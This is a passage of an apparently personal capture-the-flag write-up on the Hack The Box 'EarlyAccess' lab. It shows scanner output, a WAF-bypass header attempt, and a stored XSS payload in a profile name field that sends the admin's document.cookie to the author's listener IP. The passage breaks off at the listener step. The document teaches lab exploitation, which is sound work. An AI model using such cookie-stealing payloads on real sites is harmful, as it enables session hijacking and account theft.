<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.7.32">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2021-09-14">
<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">

<title>EarlyAccess - Hack The Box – Exploit.se</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
html { -webkit-text-size-adjust: 100%; }
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed quarto-light">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../assets/images/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../writeups.html"> 
<span class="menu-text">Writeups</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">EarlyAccess - Hack The Box</h1>
                  <div>
        <div class="description">
          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">September 14, 2021</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
  <li><a href="#step-6" id="toc-step-6" class="nav-link" data-scroll-target="#step-6">Step 6</a></li>
  <li><a href="#step-7" id="toc-step-7" class="nav-link" data-scroll-target="#step-7">Step 7</a></li>
  </ul></li>
  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
  <ul class="collapse">
  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
  <li><a href="#step-4-1" id="toc-step-4-1" class="nav-link" data-scroll-target="#step-4-1">Step 4</a></li>
  </ul></li>
  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">REFERENCES</a></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p>Standard enum with nmap, dirb, nikto, ffuf.</p>
<p><strong>NMAP:</strong></p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> 10.10.11.110</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> discovery disabled <span class="er">(</span><span class="ex">-Pn</span><span class="kw">)</span><span class="bu">.</span> All addresses will be marked <span class="st">'up'</span> and scan times will be slower.</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.91 <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2021-09-14 12:29 CEST</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for 10.10.11.110</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.027s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 997 closed ports</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>    STATE SERVICE  VERSION</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="er">(</span><span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">2048</span> e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>  open  http     Apache httpd 2.4.38</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Apache/2.4.38 <span class="er">(</span><span class="ex">Debian</span><span class="kw">)</span></span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Did not follow redirect to https://earlyaccess.htb/</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span> open  ssl/http Apache httpd 2.4.38 <span class="er">(</span><span class="kw">(</span><span class="ex">Debian</span><span class="kw">))</span></span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Apache/2.4.38 <span class="er">(</span><span class="ex">Debian</span><span class="kw">)</span></span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> EarlyAccess</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2021-08-18T14:46:57</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2022-08-18T14:46:57</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> TLS randomness does not represent time</span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">tls-alpn:</span> </span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  http/1.1</span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: Host: 172.18.0.102<span class="kw">;</span> <span class="ex">OS:</span> Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>DIRB:</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/scanners/linux]</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> dirb https://10.10.11.110                                                     </span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">URL_BASE:</span> https://10.10.11.110/</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">WORDLIST_FILES:</span> /usr/share/dirb/wordlists/common.txt</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">----</span> Scanning URL: https://10.10.11.110/ <span class="at">----</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> https://10.10.11.110/index.html <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:406</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>NIKTO:</strong></p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[~/Documents/scanners/linux]</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nikto <span class="at">-h</span> https://10.10.11.110</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">-</span> Nikto v2.1.6</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">---------------------------------------------------------------------------</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Target IP:          10.10.11.110</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Target Hostname:    10.10.11.110</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Target Port:        443</span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">---------------------------------------------------------------------------</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> SSL Info:        Subject:  /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb</span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">Ciphers:</span>  ECDHE-RSA-AES256-GCM-SHA384</span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>                   <span class="ex">Issuer:</span>   /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb</span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Start Time:         2021-09-14 12:30:26 <span class="er">(</span><span class="ex">GMT2</span><span class="kw">)</span></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="ex">---------------------------------------------------------------------------</span></span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Server: nginx/1.14.2</span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> The site uses SSL and Expect-CT header is not present.</span>
<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> The Content-Encoding header is set to <span class="st">"deflate"</span> this may mean that the server is vulnerable to the BREACH attack.</span>
<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Hostname <span class="st">'10.10.11.110'</span> does not match certificate<span class="st">'s names: earlyaccess.htb</span></span>
<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="st">+ Server banner has changed from '</span>nginx/1.14.2<span class="st">' to '</span>Apache/2.4.38 <span class="er">(</span><span class="ex">Debian</span><span class="kw">)</span><span class="st">' which may suggest a WAF, load balancer or proxy is in place</span></span>
<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a><span class="st">+ Retrieved x-powered-by header: PHP/7.4.21</span></span>
<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="st">+ Cookie XSRF-TOKEN created without the secure flag</span></span>
<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a><span class="st">+ Cookie XSRF-TOKEN created without the httponly flag</span></span>
<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a><span class="st">+ Cookie earlyaccess_session created without the secure flag</span></span>
<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="st">+ Cookie earlyaccess_session created without the httponly flag</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>FFUF:</strong></p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> https://earlyaccess.htb/ <span class="at">-H</span> <span class="st">"Host: https://FUZZ.earlyaccess.htb"</span> <span class="at">-fw</span> 83</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">N/A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Using the different enum tools triggers the <strong>WAF</strong> which bans us for 1 minute.</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>┌──(void㉿void)-[/git/htb/earlyaccess]</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>└─$ curl -vk https://earlyaccess.htb                                               </span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>..</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>&gt; GET / HTTP/1.1</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>&gt; Host: earlyaccess.htb</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span> HTTP/1.1 200 OK</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> html<span class="dt">&gt;</span></span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">head</span><span class="dt">&gt;</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">title</span><span class="dt">&gt;</span>Banned<span class="dt">&lt;/</span><span class="kw">title</span><span class="dt">&gt;</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span></span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    body {</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">width</span><span class="ch">:</span> <span class="dv">35</span><span class="dt">em</span><span class="op">;</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>        <span class="kw">margin</span><span class="ch">:</span> <span class="dv">0</span> <span class="bu">auto</span><span class="op">;</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>        <span class="kw">font-family</span><span class="ch">:</span> <span class="dv">Tahoma</span><span class="op">,</span> <span class="dv">Verdana</span><span class="op">,</span> <span class="dv">Arial</span><span class="op">,</span> <span class="dv">sans-serif</span><span class="op">;</span></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    }</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">head</span><span class="dt">&gt;</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>You are banned!<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>        Our WAF detected suspicious traffic coming from your IP! You are temporarily banned from accessing the webpage for one minute.</span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Trying to bypass the <em>WAF</em> using simple HTTP Headers still result in a temporary ban.</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/common.txt <span class="at">-u</span> https://earlyaccess.htb/FUZZ <span class="at">-H</span> <span class="st">"X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Browsing through the website we find: - chr0x6eos@earlyaccess.htb (from the SSL Cert) - admin@earlyaccess.htb in the page footer - We are able to register an account and login</p>
<p>Lets start by register an account, <code>test1@asd.as:123123123</code>. Reading through the Forums message board we find:</p>
<blockquote class="blockquote">
<p>Hello Game-Corp Team!</p>
<p>I have found a critical bug in the game-scoreboard.<br>
My username returns strange errors on the scoreboard. Please fix this issue!</p>
<p>Thanks, <strong>SingleQuoteMan</strong> &gt;Hey SingleQuoteMan, &gt; Thank you for reaching out to us.<br>
Our internal team has already added this to our Bug-Tracker and is currently working on resolving this issue permanently. For now, a <strong>temporary fix</strong> was issued that prevents creation of accounts with invalid usernames. (Your account is also affected by this change!)<br>
We are incredibly sorry for the inconvenience this has caused and will update you as soon as we have resolved this problem. Please feel welcome to reach out to us with any further questions you may as we would be more than happy to help. &gt; Take care, your Support-Team</p>
</blockquote>
<p>Vulnerable name-field? Possible to do SQLi and/or XSS?</p>
<blockquote class="blockquote">
<p>I have recently bought an Early Access Game-Key from your store, however now that I am trying to register the key to my account I keep getting errors. This is the error I get: “Game-key is invalid! If this issue persists, please contact the admin!” &gt;Hello 3lit3H4kr, &gt; Thank you for reaching out to us.<br>
Due to the high load of traffic our Game-Key verification-API is currently experiencing issues. We are implementing a solution to fallback to <strong>manual verification</strong> by the support staff.<br>
Please <strong>use the contact form</strong> to privately contact an administrative user and send the Game-Key for manual verification. We are incredibly sorry for the inconvenience this has caused you. We are doing our best to resolve this issue promptly. &gt; Take care, your Support-Team</p>
</blockquote>
<p>Possible to steal an admin cookie through XSS? As both posts hints, I should probably play around with the <code>name</code> field in the profile settings in order to steal an admin cookie.</p>
<p><code>Name: &lt;script&gt;var i=new Image;i.src="https://10.10.14.2/?"+document.cookie;&lt;/script&gt;</code></p>
<p>![[earlyaccess-01.png]]</p>
<p>Send an mail using the website contact form, setup a listener and wait for incoming cookie.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
